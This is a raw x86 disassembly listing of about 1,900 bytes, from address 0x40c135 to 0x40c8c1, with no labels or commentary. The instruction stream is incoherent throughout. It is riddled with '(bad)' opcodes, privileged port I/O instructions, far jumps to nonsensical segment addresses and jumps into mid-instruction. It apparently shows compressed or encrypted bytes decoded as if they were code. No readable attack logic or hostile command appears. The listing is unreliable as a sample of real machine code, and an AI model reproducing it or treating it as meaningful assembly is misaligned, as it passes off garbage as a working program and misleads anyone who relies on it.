  40c135:	xor    cl,BYTE PTR [ebp+edx*8+0x44404db0]
  40c13c:	jecxz  0x40c16b
  40c13e:	pop    ss
  40c13f:	mov    dl,0xe3
  40c141:	repz sti 
  40c143:	or     BYTE PTR [ebx+0x5664bca8],ch
  40c149:	mov    esp,DWORD PTR [ebx-0x1e]
  40c14c:	mov    esi,0x2d969b71
  40c151:	stc    
  40c152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c153:	cs sahf 
  40c155:	out    dx,eax
  40c156:	or     DWORD PTR [ebx],eax
  40c158:	jmp    0x385:0xeffdf3b0
  40c15f:	nop
  40c160:	sbb    DWORD PTR [edi-0x642ec1cd],ecx
  40c166:	call   0xc67a6ff9
  40c16b:	and    ebp,DWORD PTR [ecx]
  40c16d:	jecxz  0x40c1c0
  40c16f:	in     al,dx
  40c170:	mov    ah,0xa0
  40c172:	jg     0x40c1a0
  40c174:	inc    esi
  40c175:	pop    edx
  40c176:	in     eax,0xcc
  40c178:	pusha  
  40c179:	lock jp 0x40c13c
  40c17c:	out    0xee,eax
  40c17e:	mov    al,0xb0
  40c180:	sbb    esp,DWORD PTR [eax]
  40c182:	sub    esp,DWORD PTR [edi+0x6c]
  40c185:	test   al,0x4c
  40c187:	jge    0x40c1b9
  40c189:	pop    edi
  40c18a:	enter  0xb64c,0xc3
  40c18e:	xchg   ebp,eax
  40c18f:	sahf   
  40c190:	sub    al,BYTE PTR [edx+0x62]
  40c193:	jb     0x40c1a4
  40c195:	push   edx
  40c196:	les    edx,FWORD PTR [ebx+0x27]
  40c199:	sbb    eax,0xaf6ec863
  40c19e:	retf   
  40c19f:	stc    
  40c1a0:	xor    eax,0x95e90e68
  40c1a5:	add    ebp,ecx
  40c1a7:	jnp    0x40c1e4
  40c1a9:	fimul  DWORD PTR [edi]
  40c1ab:	push   ds
  40c1ac:	aas    
  40c1ad:	jmp    0x6bffce65
  40c1b2:	jns    0x40c20e
  40c1b4:	mov    DWORD PTR [edi-0x47],ebp
  40c1b7:	(bad)  
  40c1b8:	push   edx
  40c1b9:	dec    esi
  40c1ba:	pop    ecx
  40c1bb:	jnp    0x40c228
  40c1bd:	fimul  DWORD PTR [eax-0x7ae23997]
  40c1c3:	sbb    eax,0x6f8a60f9
  40c1c8:	rcl    BYTE PTR [edx+0x2f356ffb],1
  40c1ce:	add    cl,dl
  40c1d0:	push   edi
  40c1d1:	(bad)  
  40c1d2:	pop    ebp
  40c1d3:	push   ecx
  40c1d4:	pop    edx
  40c1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d6:	sahf   
  40c1d7:	inc    ecx
  40c1d8:	shl    BYTE PTR [eax-0x66],1
  40c1db:	fist   WORD PTR [edx-0x4323cc98]
  40c1e1:	xchg   ecx,eax
  40c1e2:	jg     0x40c1a6
  40c1e4:	ror    DWORD PTR [esi+0x3b],0xbe
  40c1e8:	and    edi,eax
  40c1ea:	mov    DWORD PTR [ebx-0x5b],0xf2fb3c30
  40c1f1:	sub    DWORD PTR [edx],esp
  40c1f3:	add    eax,0xa4b19f5a
  40c1f8:	aam    0xb3
  40c1fa:	in     eax,0x66
  40c1fc:	adc    al,0x1d
  40c1fe:	out    dx,eax
  40c1ff:	pop    es
  40c200:	pop    eax
  40c201:	inc    esp
  40c202:	sti    
  40c203:	(bad)  
  40c204:	adc    ebx,DWORD PTR [edx]
  40c206:	pusha  
  40c207:	inc    eax
  40c208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c209:	imul   esp,DWORD PTR es:[edi-0x5bd33384],0xffffffba
  40c211:	lahf   
  40c212:	dec    ebp
  40c213:	push   ecx
  40c214:	xchg   BYTE PTR [ebx],ah
  40c216:	sub    BYTE PTR [ebx],dl
  40c218:	xchg   esi,eax
  40c219:	mov    bh,0xe0
  40c21b:	push   esi
  40c21c:	inc    edi
  40c21d:	jno    0x40c286
  40c21f:	push   edi
  40c220:	and    BYTE PTR [edx+ecx*4],0x5c
  40c224:	or     ebp,DWORD PTR [ecx-0x6228441e]
  40c22a:	lock lds ebp,FWORD PTR ds:0x146e9348
  40c231:	(bad)  
  40c233:	test   BYTE PTR [esi+0x56],ch
  40c236:	sbb    BYTE PTR [edx-0xe66c5ad],dl
  40c23c:	adc    bh,dh
  40c23e:	inc    ebp
  40c23f:	lock and al,0x56
  40c242:	shl    BYTE PTR ds:0x9675c194,1
  40c248:	mov    ebx,0x68535861
  40c24d:	cmp    esp,edi
  40c24f:	mov    bl,0xd8
  40c251:	mov    ebp,0xf1865187
  40c256:	addr16 push edx
  40c258:	inc    edx
  40c259:	mov    eax,ds:0xd6c7a84d
  40c25e:	xchg   ebx,eax
  40c25f:	jnp    0x40c250
  40c261:	lock imul esi,DWORD PTR [edi+0x44],0xc19cd6fe
  40c269:	dec    ebx
  40c26a:	sbb    al,0x26
  40c26c:	lds    ebx,FWORD PTR [edi+0x842faf4]
  40c272:	aad    0xc1
  40c274:	sub    DWORD PTR [edi],ecx
  40c276:	ins    BYTE PTR es:[edi],dx
  40c277:	sbb    DWORD PTR ds:0x48a84665,0xdbe535f2
  40c281:	loope  0x40c2be
  40c283:	mov    bl,0x54
  40c285:	aam    0xe8
  40c287:	jnp    0x40c21a
  40c289:	add    bl,ch
  40c28b:	mov    al,ds:0xb96dff67
  40c290:	xchg   esi,eax
  40c291:	push   0x3c3d69ab
  40c296:	(bad)  
  40c297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c298:	ss pop ecx
  40c29a:	mov    cl,0xc8
  40c29c:	int3   
  40c29d:	push   eax
  40c29e:	pop    esi
  40c29f:	pop    ecx
  40c2a0:	xor    BYTE PTR [edi+0x15],0x8
  40c2a4:	push   ds
  40c2a5:	cs xchg ecx,eax
  40c2a7:	dec    eax
  40c2a8:	or     al,0xb5
  40c2aa:	into   
  40c2ab:	mov    ebp,0x56dfedd1
  40c2b0:	sbb    BYTE PTR [ebp+0xb814b4d],bl
  40c2b6:	mov    DWORD PTR [eax],esp
  40c2b8:	es scas eax,DWORD PTR es:[edi]
  40c2ba:	mov    WORD PTR [ecx+ebx*2+0x6b],gs
  40c2be:	cmp    al,0x33
  40c2c0:	sub    ebx,esp
  40c2c2:	xchg   ebx,eax
  40c2c3:	mov    WORD PTR [esi],es
  40c2c5:	jl     0x40c28d
  40c2c7:	jmp    0x9af6:0x4137dd5a
  40c2ce:	xor    DWORD PTR [ebp+0x2008c1dc],esp
  40c2d4:	dec    esi
  40c2d5:	jbe    0x40c314
  40c2d7:	pop    ecx
  40c2d8:	test   eax,0xf543a2f3
  40c2dd:	pop    ecx
  40c2de:	mov    esi,0x3b2eacc5
  40c2e3:	ins    DWORD PTR es:[edi],dx
  40c2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2e5:	sbb    al,0x35
  40c2e7:	aam    0xb7
  40c2e9:	outs   dx,BYTE PTR ds:[esi]
  40c2ea:	arpl   sp,dx
  40c2ec:	mov    esp,0x2953c47
  40c2f1:	cdq    
  40c2f2:	mov    ah,0x7e
  40c2f4:	mov    ch,0x4d
  40c2f6:	cmp    eax,DWORD PTR [eax-0x7e]
  40c2f9:	mov    ebx,0x548d9dd2
  40c2fe:	cs pop ss
  40c300:	jl     0x40c359
  40c302:	push   eax
  40c303:	aaa    
  40c304:	cli    
  40c305:	inc    ebp
  40c306:	icebp  
  40c307:	dec    ebx
  40c308:	fstp   DWORD PTR [ecx+0x3d]
  40c30b:	cmp    eax,0xa655c5dc
  40c310:	add    edi,edi
  40c312:	gs jo  0x40c2d5
  40c315:	rcl    DWORD PTR [esi-0x48],1
  40c318:	cmp    eax,0x5c62dd3
  40c31d:	bound  ebp,QWORD PTR [ecx+0x41]
  40c320:	pop    edx
  40c321:	pop    ebp
  40c322:	jp     0x40c37b
  40c324:	xchg   BYTE PTR cs:[edx-0x3cc2b08f],ch
  40c32b:	xchg   edx,eax
  40c32c:	xor    BYTE PTR [eax+0xc],bl
  40c32f:	neg    DWORD PTR [ecx+esi*8-0x30ed327f]
  40c336:	jmp    0xdcefe7c5
  40c33b:	out    0x26,al
  40c33d:	lds    ecx,FWORD PTR [edx]
  40c33f:	cwde   
  40c340:	test   BYTE PTR ds:0x1d3ebbc1,0xe0
  40c347:	inc    ebx
  40c348:	or     al,0x54
  40c34a:	fadd   st(1),st
  40c34c:	pop    esi
  40c34d:	shl    al,cl
  40c34f:	(bad)  
  40c350:	pop    esp
  40c351:	sub    al,dl
  40c353:	cmp    edx,ecx
  40c355:	inc    edx
  40c356:	jmp    0x40c333
  40c358:	fwait
  40c359:	sub    eax,0xfd1dbd0b
  40c35e:	sar    BYTE PTR [ecx+0x14518dc5],cl
  40c364:	sub    edi,DWORD PTR [edi-0x3]
  40c367:	and    dl,BYTE PTR [eax+0xae19047]
  40c36d:	or     al,0x73
  40c36f:	push   0xffffffe3
  40c371:	push   0x32
  40c373:	jnp    0x40c31d
  40c375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c376:	out    0x4e,eax
  40c378:	clc    
  40c379:	mov    eax,0xf8f39903
  40c37e:	call   0xe2a08dd6
  40c383:	into   
  40c384:	out    dx,al
  40c385:	in     al,dx
  40c386:	push   eax
  40c387:	mov    edx,0xddfbf88e
  40c38c:	mov    bl,BYTE PTR [ebx]
  40c38e:	mov    edx,DWORD PTR [ebp-0x5c]
  40c391:	xor    eax,edi
  40c393:	xor    edx,edx
  40c395:	or     eax,edx
  40c397:	mov    edx,DWORD PTR [ebp+0x14]
  40c39a:	shl    ecx,0x1e
  40c39d:	jmp    0x40c927
  40c3a2:	sbb    esp,edi
  40c3a4:	adc    eax,0x1913193b
  40c3a9:	aad    0x32
  40c3ab:	into   
  40c3ac:	sti    
  40c3ad:	mov    ah,0x63
  40c3af:	cmp    ecx,esi
  40c3b1:	mov    dl,0x44
  40c3b3:	ficom  WORD PTR [esi]
  40c3b5:	push   ss
  40c3b6:	cmp    eax,0x88161604
  40c3bb:	test   eax,0x3101dd29
  40c3c0:	test   DWORD PTR [esi-0x37],ecx
  40c3c3:	enter  0x5d0,0x24
  40c3c7:	test   eax,0x8b99b50f
  40c3cc:	push   edi
  40c3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3ce:	ret    
  40c3cf:	pop    esi
  40c3d0:	out    0xa1,eax
  40c3d2:	scas   eax,DWORD PTR es:[edi]
  40c3d3:	mov    dl,BYTE PTR es:[edx+ecx*4+0x70cb09c8]
  40c3db:	adc    eax,0xbebe5428
  40c3e0:	test   BYTE PTR [ecx-0x62],cl
  40c3e3:	retf   0x7def
  40c3e6:	sbb    BYTE PTR [ebx],ah
  40c3e8:	nop
  40c3e9:	stc    
  40c3ea:	pop    es
  40c3eb:	(bad)  
  40c3ec:	cmp    dl,bl
  40c3ee:	pushf  
  40c3ef:	stos   DWORD PTR es:[edi],eax
  40c3f0:	aad    0x39
  40c3f2:	inc    edi
  40c3f3:	mov    eax,0x49d12f25
  40c3f9:	push   esp
  40c3fa:	adc    eax,0x8a7c45a4
  40c3ff:	push   0x5b
  40c401:	imul   ecx,DWORD PTR [edi-0x3c7b8b7b],0xe2f21a67
  40c40b:	and    cl,bl
  40c40d:	mov    esi,0xa683947b
  40c412:	cmp    al,0x5b
  40c414:	loopne 0x40c398
  40c416:	aas    
  40c417:	int    0x91
  40c419:	push   es
  40c41a:	xor    cl,BYTE PTR [eax]
  40c41c:	push   esp
  40c41d:	push   esi
  40c41e:	outs   dx,DWORD PTR ds:[esi]
  40c41f:	add    cl,bl
  40c421:	stos   DWORD PTR es:[edi],eax
  40c422:	ret    
  40c423:	and    DWORD PTR [esi],esp
  40c425:	mov    al,0x7e
  40c427:	sbb    edi,DWORD PTR [ebx+0xffa9de]
  40c42d:	jne    0x40c40e
  40c42f:	outs   dx,BYTE PTR ds:[esi]
  40c430:	jo     0x40c44f
  40c432:	pop    esi
  40c433:	mov    dh,0xf0
  40c435:	aaa    
  40c436:	retf   0xab78
  40c439:	mov    ds:0xc3ace123,eax
  40c43e:	xor    eax,0x5d08070a
  40c443:	and    edx,0xffffff86
  40c446:	std    
  40c447:	jnp    0x40c4b2
  40c449:	(bad)  
  40c44a:	mov    ah,0x9e
  40c44c:	outs   dx,BYTE PTR ds:[esi]
  40c44d:	nop
  40c44e:	into   
  40c44f:	dec    edi
  40c450:	shl    DWORD PTR [ebp+0x1d],1
  40c453:	mov    bh,0x43
  40c455:	sub    al,0xeb
  40c457:	pusha  
  40c458:	xor    DWORD PTR [edx+0x222e81d7],0x0
  40c45f:	addr16 mov ah,0x48
  40c462:	mov    ah,0xb4
  40c464:	pop    ebx
  40c465:	or     eax,ebx
  40c467:	rcr    DWORD PTR [edx+0x35],1
  40c46a:	cli    
  40c46b:	shr    DWORD PTR [esi-0x3f],cl
  40c46e:	lea    esi,[ecx-0x4d0e0ded]
  40c474:	aad    0x6f
  40c476:	mov    ebp,0x1bc1316a
  40c47b:	push   cs
  40c47c:	mov    ?,WORD PTR [ebp-0x51]
  40c47f:	jne    0xecd95e6e
  40c485:	mov    di,0xc8f5
  40c489:	cmp    eax,0x18fad41c
  40c48e:	xchg   ebp,eax
  40c48f:	sbb    eax,0x80e6c5e3
  40c494:	(bad)  
  40c496:	mov    ds:0xe078a84b,al
  40c49b:	pop    edx
  40c49c:	and    DWORD PTR [edi+0x6350872c],edx
  40c4a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a3:	add    ebp,ebp
  40c4a5:	sub    edi,edi
  40c4a7:	sub    BYTE PTR [edx],ah
  40c4a9:	push   ecx
  40c4aa:	jmp    0xffe2:0x82f4e386
  40c4b1:	nop
  40c4b2:	sbb    esi,esp
  40c4b4:	mov    esi,ebx
  40c4b6:	and    eax,edx
  40c4b8:	ins    DWORD PTR es:[edi],dx
  40c4b9:	pop    eax
  40c4ba:	les    esi,FWORD PTR [eax-0x16a46409]
  40c4c0:	pop    esp
  40c4c1:	test   BYTE PTR [ebp-0x33],bl
  40c4c4:	and    ecx,DWORD PTR [ecx]
  40c4c6:	bound  esi,QWORD PTR [esi+edx*2]
  40c4c9:	and    cl,BYTE PTR [edx-0x47]
  40c4cc:	xor    al,0xe7
  40c4ce:	call   0xc696:0x72e01c9e
  40c4d5:	fdivr  DWORD PTR ds:0x3988260
  40c4db:	fcom   DWORD PTR [ebp-0x19d38c0]
  40c4e1:	push   ss
  40c4e2:	in     eax,dx
  40c4e3:	shr    ebp,0xb3
  40c4e6:	leave  
  40c4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e8:	ins    BYTE PTR es:[edi],dx
  40c4e9:	loope  0x40c561
  40c4eb:	pop    ss
  40c4ec:	call   0x2862:0xf91bd7c9
  40c4f3:	mov    edi,0x2893ecb1
  40c4f8:	xor    BYTE PTR [ebp-0x13],0xfa
  40c4fc:	jmp    0x24e056a0
  40c501:	mov    esp,0x31388fda
  40c506:	cmp    al,0xb5
  40c508:	jno    0x40c557
  40c50a:	fwait
  40c50b:	xor    al,0xd8
  40c50d:	jo     0x40c583
  40c50f:	data16 ins BYTE PTR es:[edi],dx
  40c511:	out    0x83,al
  40c513:	jno    0x40c4d1
  40c515:	sbb    DWORD PTR [edx-0x59],ebp
  40c518:	push   edi
  40c519:	retf   
  40c51a:	add    DWORD PTR [ebx],0xffffff89
  40c51d:	mov    ebx,0xaa162229
  40c522:	pop    esi
  40c523:	(bad)  
  40c524:	fs mov esi,0xebc67c81
  40c52a:	int3   
  40c52b:	xor    al,0x34
  40c52d:	push   0xfffffff8
  40c52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c530:	adc    BYTE PTR [edx+0x52],ah
  40c533:	sub    ecx,edi
  40c535:	jnp    0x40c4dc
  40c537:	aad    0x5c
  40c539:	in     al,dx
  40c53a:	outs   dx,DWORD PTR ds:[esi]
  40c53b:	clc    
  40c53c:	or     eax,0xe041ad9a
  40c541:	sub    al,0x4f
  40c543:	xchg   ebx,eax
  40c544:	imul   ebp,DWORD PTR [eax],0x316d69c4
  40c54a:	lods   eax,DWORD PTR ds:[esi]
  40c54b:	mov    dl,0x7e
  40c54d:	jae    0x40c599
  40c54f:	rol    DWORD PTR [esi+0xbf787c8],1
  40c555:	or     BYTE PTR [ebx+0x7b],0x52
  40c559:	stos   DWORD PTR es:[edi],eax
  40c55a:	push   esi
  40c55b:	fld    TBYTE PTR [esi+edi*1+0x29d357b7]
  40c562:	push   eax
  40c563:	sbb    al,0x3f
  40c565:	and    DWORD PTR [ecx+0x6a],0x82a83060
  40c56c:	dec    ebx
  40c56d:	jne    0x40c5bc
  40c56f:	pusha  
  40c570:	push   ss
  40c571:	or     dl,cl
  40c573:	dec    eax
  40c574:	mov    cl,0x7d
  40c576:	int    0x67
  40c578:	(bad)  
  40c579:	xor    DWORD PTR [esp+ebx*4+0x3],ecx
  40c57d:	or     DWORD PTR [ebp+ebp*2-0x33],ebp
  40c581:	or     dh,BYTE PTR [edi-0x64]
  40c584:	js     0x40c59f
  40c586:	das    
  40c587:	pop    es
  40c588:	push   0x3e0850f5
  40c58d:	mov    ds:0x71f5cc76,eax
  40c592:	enter  0xcf93,0x85
  40c596:	stos   BYTE PTR es:[edi],al
  40c597:	sub    BYTE PTR [edi],0xf8
  40c59a:	loopne 0x40c616
  40c59c:	out    dx,eax
  40c59d:	add    esi,DWORD PTR [ebx+0xd]
  40c5a0:	fidiv  WORD PTR [eax]
  40c5a2:	sub    BYTE PTR [edx],0x2c
  40c5a5:	sbb    al,0xef
  40c5a7:	dec    ecx
  40c5a8:	pop    es
  40c5a9:	sub    al,0x60
  40c5ab:	vpunpckhdq ymm7,ymm4,YMMWORD PTR [edi-0x39]
  40c5b0:	ins    BYTE PTR es:[edi],dx
  40c5b1:	or     bl,ch
  40c5b3:	sar    bl,0x54
  40c5b6:	pop    edx
  40c5b7:	jmp    0x40c5e4
  40c5b9:	jmp    0xdcb27f73
  40c5be:	jmp    0x1616:0x23d80894
  40c5c5:	adc    edx,DWORD PTR [ebx-0x51]
  40c5c8:	jne    0x40c63c
  40c5ca:	mov    edx,0x64b8282a
  40c5cf:	lods   al,BYTE PTR ds:[esi]
  40c5d0:	push   ds
  40c5d1:	mov    esp,0x5bbe52f7
  40c5d6:	cmp    ebx,DWORD PTR [edx]
  40c5d8:	pop    ds
  40c5d9:	pop    es
  40c5da:	jae    0x40c56f
  40c5dc:	frndint 
  40c5de:	sbb    ebx,DWORD PTR [ecx-0x40]
  40c5e1:	mov    ebx,0x6e95acd8
  40c5e6:	jl     0x40c63f
  40c5e8:	fcomp  st(4)
  40c5ea:	adc    ah,BYTE PTR cs:[ebp-0x4a5e502d]
  40c5f1:	std    
  40c5f2:	or     dl,BYTE PTR [eax]
  40c5f4:	mov    al,0xa0
  40c5f6:	fs jnp 0x40c58f
  40c5f9:	mov    al,0x84
  40c5fb:	mov    ds:0x9152735c,eax
  40c600:	shr    BYTE PTR [edi-0x1e1dec55],cl
  40c606:	loope  0x40c593
  40c608:	mov    ds:0xa359d34f,al
  40c60d:	xor    al,0x65
  40c60f:	test   esp,edi
  40c611:	mov    ecx,0xc3becdeb
  40c616:	sub    esi,edx
  40c618:	mov    cl,0xbd
  40c61a:	inc    ecx
  40c61b:	rcl    DWORD PTR [ebx+0x42],0x3d
  40c61f:	test   DWORD PTR [edi+ebx*1],eax
  40c622:	not    BYTE PTR [eax+0x65f6b814]
  40c628:	xor    eax,0xb23a8892
  40c62d:	fisttp WORD PTR [edx+edx*8+0xb]
  40c631:	rcr    DWORD PTR [ebx+0x69710831],0x3
  40c638:	add    ebp,ebx
  40c63a:	jb     0x40c607
  40c63c:	ret    0x8e1c
  40c63f:	sub    al,0xd1
  40c641:	or     dl,BYTE PTR [edi]
  40c643:	xchg   ebx,eax
  40c644:	mov    ebx,0x31361d9d
  40c649:	xchg   ebx,eax
  40c64a:	xchg   ebp,eax
  40c64b:	xchg   edx,eax
  40c64c:	jecxz  0x40c698
  40c64e:	shl    DWORD PTR [edx-0x7f0d0763],cl
  40c654:	and    edi,DWORD PTR [ecx]
  40c656:	out    dx,al
  40c657:	xchg   dl,ah
  40c659:	mov    esi,0x933fd92b
  40c65e:	mul    DWORD PTR ds:0xd863acda
  40c664:	cli    
  40c665:	mov    dl,0x4e
  40c667:	mov    edi,ebx
  40c669:	mov    bl,0x28
  40c66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66c:	mov    ebx,0xd6e4dace
  40c671:	mov    eax,0xd1c7beb
  40c676:	cmp    eax,0x58228d
  40c67b:	ss or  esi,edi
  40c67e:	xor    al,0x64
  40c680:	aaa    
  40c681:	test   eax,esi
  40c683:	xchg   esp,eax
  40c684:	xchg   ebp,eax
  40c685:	sub    ch,BYTE PTR [edi]
  40c687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c688:	(bad)  
  40c68a:	inc    esi
  40c68b:	xchg   ecx,eax
  40c68c:	add    esp,DWORD PTR [ecx-0x32985c6f]
  40c692:	push   eax
  40c693:	jbe    0x40c64d
  40c695:	push   ebx
  40c696:	pop    ecx
  40c697:	push   es
  40c698:	stc    
  40c699:	xchg   edi,eax
  40c69a:	jno    0x40c6fe
  40c69c:	lods   eax,DWORD PTR ds:[esi]
  40c69d:	std    
  40c69e:	add    eax,ecx
  40c6a0:	outs   dx,BYTE PTR ds:[esi]
  40c6a1:	clc    
  40c6a2:	test   eax,0x170d7a5
  40c6a7:	push   edi
  40c6a8:	mov    ds:0xa3bff824,eax
  40c6ad:	pop    esp
  40c6ae:	(bad)  
  40c6af:	push   0x8dfbdb18
  40c6b4:	stos   BYTE PTR es:[edi],al
  40c6b5:	ins    BYTE PTR es:[edi],dx
  40c6b6:	mov    al,ds:0xa66c97b7
  40c6bb:	xchg   ecx,eax
  40c6bc:	inc    ecx
  40c6bd:	mov    dh,0xdc
  40c6bf:	jne    0x40c643
  40c6c1:	stc    
  40c6c2:	dec    eax
  40c6c3:	aaa    
  40c6c4:	and    BYTE PTR [eax+0x14],ch
  40c6c7:	imul   esp,DWORD PTR ds:0x4d1953bd,0x7e
  40c6ce:	jns    0x40c655
  40c6d0:	mov    ebx,DWORD PTR [edx+0x25]
  40c6d3:	sub    esp,ecx
  40c6d5:	mov    WORD PTR [edi*8+0x9d2fde0],es
  40c6dc:	mov    ds:0xa10587de,eax
  40c6e1:	fadd   QWORD PTR [ebx]
  40c6e3:	jg     0x40c6d7
  40c6e5:	dec    ebp
  40c6e6:	push   0xefb555ad
  40c6eb:	mov    al,ds:0x7a931184
  40c6f0:	mov    ecx,0x4d40c5a5
  40c6f5:	in     eax,0xb7
  40c6f7:	loop   0x40c68b
  40c6f9:	mov    esp,0x5c8c37e4
  40c6fe:	fiadd  WORD PTR [ebx]
  40c700:	test   cl,0x8b
  40c703:	imul   esi,ebp,0xffffff95
  40c706:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c708:	inc    eax
  40c709:	ds addr16 jb 0x40c750
  40c70d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c70e:	and    BYTE PTR ds:0xcb4cd403,al
  40c714:	or     al,0x7b
  40c716:	in     eax,0x2e
  40c718:	nop
  40c719:	xor    al,0xd9
  40c71b:	add    eax,esp
  40c71d:	pop    esi
  40c71e:	(bad)  
  40c71f:	jnp    0x40c70f
  40c721:	ins    DWORD PTR es:[edi],dx
  40c722:	cmp    dh,BYTE PTR [ebx+edx*2]
  40c725:	(bad)  
  40c727:	les    eax,FWORD PTR [eax+0x27]
  40c72a:	daa    
  40c72b:	inc    edx
  40c72c:	and    DWORD PTR [edi-0x56],0xffffffc2
  40c730:	or     eax,0x7e315416
  40c735:	popf   
  40c736:	or     ah,BYTE PTR ss:[edx+0x60566f76]
  40c73d:	mov    cs,WORD PTR [ebp+0x521e5174]
  40c743:	in     al,0x5
  40c745:	add    DWORD PTR [edx+0x33],ebx
  40c748:	xchg   esp,eax
  40c749:	mov    eax,ds:0x9c846d1e
  40c74e:	std    
  40c74f:	pop    eax
  40c750:	mov    esp,0x5054c744
  40c755:	inc    ebx
  40c756:	mov    ah,0xd3
  40c758:	add    DWORD PTR [eax+0x4a],ecx
  40c75b:	and    ebp,edi
  40c75d:	and    edx,ebx
  40c75f:	shl    DWORD PTR [ebx-0x2f],0x32
  40c763:	div    DWORD PTR ss:[ebp+0x70]
  40c767:	mov    dh,0x43
  40c769:	(bad)  
  40c76a:	(bad)  
  40c76b:	mov    BYTE PTR [edi-0x21],cl
  40c76e:	cld    
  40c76f:	(bad)  
  40c770:	retf   
  40c771:	cmp    al,0x8b
  40c773:	sub    eax,0x6317573e
  40c778:	push   0x4f
  40c77a:	inc    ebx
  40c77b:	cld    
  40c77c:	in     al,dx
  40c77d:	xor    DWORD PTR [edx-0x2f],eax
  40c780:	jmp    0xba387d9f
  40c785:	(bad)  
  40c786:	int    0xa3
  40c788:	mov    DWORD PTR [eax+0x7fd02b7d],edx
  40c78e:	ds jmp 0x2b2e593b
  40c794:	sbb    dl,BYTE PTR [ecx+0x44]
  40c797:	(bad)  
  40c798:	jmp    0x40c788
  40c79a:	popa   
  40c79b:	pop    ss
  40c79c:	jae    0x40c81b
  40c79e:	dec    ecx
  40c79f:	jb     0x40c797
  40c7a1:	or     eax,0x19716de8
  40c7a6:	call   0xd79ac192
  40c7ab:	(bad)  
  40c7ac:	cmp    BYTE PTR [esi],bh
  40c7ae:	imul   ebx,ebp,0xffffffed
  40c7b1:	xchg   edx,eax
  40c7b2:	js     0x40c7a1
  40c7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7b5:	pop    eax
  40c7b6:	ss stc 
  40c7b8:	pop    ecx
  40c7b9:	xor    ecx,DWORD PTR [edx+0x4]
  40c7bc:	push   esp
  40c7bd:	or     eax,0x3647948
  40c7c2:	(bad)  
  40c7c3:	ror    BYTE PTR [edx-0x1f7c8b52],cl
  40c7c9:	xchg   ebx,eax
  40c7ca:	or     ebx,0xffffff84
  40c7cd:	int3   
  40c7ce:	inc    esp
  40c7cf:	(bad)  
  40c7d1:	int3   
  40c7d2:	lods   eax,DWORD PTR ds:[esi]
  40c7d3:	in     al,dx
  40c7d4:	xor    eax,0x86b6d373
  40c7d9:	fmul   DWORD PTR [edi]
  40c7db:	jle    0x40c7f3
  40c7dd:	ds jmp 0x308bce1c
  40c7e3:	leave  
  40c7e4:	aas    
  40c7e5:	dec    edi
  40c7e6:	and    BYTE PTR [edx+0x8],dl
  40c7e9:	add    eax,0x61382c1e
  40c7ee:	repz push ds
  40c7f0:	mov    dl,0x8d
  40c7f2:	pop    ebx
  40c7f3:	add    DWORD PTR [esi-0x465165e1],esp
  40c7f9:	adc    eax,0xd168369b
  40c7fe:	inc    edx
  40c7ff:	(bad)
  40c802:	sbb    al,0x4b
  40c804:	or     eax,0x2ad51543
  40c809:	fnsave [ebp-0x6ac4d11a]
  40c80f:	enter  0xd6bc,0xc1
  40c813:	fidivr DWORD PTR [ecx]
  40c815:	xor    DWORD PTR [edi],ecx
  40c817:	test   al,0xec
  40c819:	jg     0x40c87b
  40c81b:	out    0x2e,al
  40c81d:	cs jb  0x40c85f
  40c820:	dec    ecx
  40c821:	or     al,0x15
  40c823:	pop    ebx
  40c824:	push   ebx
  40c825:	xor    dh,BYTE PTR [edx+ebx*8+0x1d]
  40c829:	nop
  40c82a:	xchg   esp,ecx
  40c82c:	jne    0x40c8a3
  40c82e:	cs mov eax,0xb7ab3040
  40c834:	mov    cl,BYTE PTR [edi-0x4a]
  40c837:	add    bl,BYTE PTR [edx+0x440d06bf]
  40c83d:	popa   
  40c83e:	mov    bl,0xbf
  40c840:	xchg   edi,eax
  40c841:	xchg   BYTE PTR [eax-0x4a21a27f],ch
  40c847:	add    eax,0xe4baa84d
  40c84c:	pop    ss
  40c84d:	fdivr  DWORD PTR [eax]
  40c84f:	shr    BYTE PTR ds:0x1fe92548,0x91
  40c856:	loope  0x40c7da
  40c858:	ret    0xea51
  40c85b:	mov    dh,0x8d
  40c85d:	adc    DWORD PTR [esi-0x66],eax
  40c860:	mov    bh,0xe
  40c862:	popa   
  40c863:	call   0xfb18:0x39b77530
  40c86a:	sub    DWORD PTR [ecx+0x43],esi
  40c86d:	inc    ecx
  40c86e:	mov    ebx,DWORD PTR [ebx+ecx*2+0x72546c01]
  40c875:	mov    ch,0xe3
  40c878:	push   edi
  40c879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c87a:	ja     0x40c899
  40c87c:	pop    esi
  40c87d:	push   es
  40c87e:	add    BYTE PTR [edi-0x7],ch
  40c881:	hlt    
  40c882:	in     eax,dx
  40c883:	out    0x94,al
  40c885:	add    esp,DWORD PTR [ebx-0x5d]
  40c888:	mov    edx,0x91830a56
  40c88d:	ret    
  40c88e:	jns    0x40c8fd
  40c890:	xchg   ecx,eax
  40c891:	add    al,0x1a
  40c893:	lahf   
  40c894:	jo     0x40c88d
  40c896:	rcr    DWORD PTR [ecx-0x34b9661c],0xaf
  40c89d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c89e:	and    DWORD PTR [edi-0x7ab4d715],ebp
  40c8a4:	mov    gs,WORD PTR [eax-0x582bbaaa]
  40c8aa:	aas    
  40c8ab:	mov    ds:0xf05a3d3a,al
  40c8b0:	inc    ebp
  40c8b1:	retf   0xc2a0
  40c8b4:	cmp    BYTE PTR [ecx],dl
  40c8b6:	xchg   esp,eax
  40c8b7:	icebp  
  40c8b8:	pop    esp
  40c8b9:	aad    0x2e
  40c8bb:	sbb    cl,BYTE PTR ds:0xa69f38a5
  40c8c1:	add    DWORD PTR ds:[esi],0xb06f366f
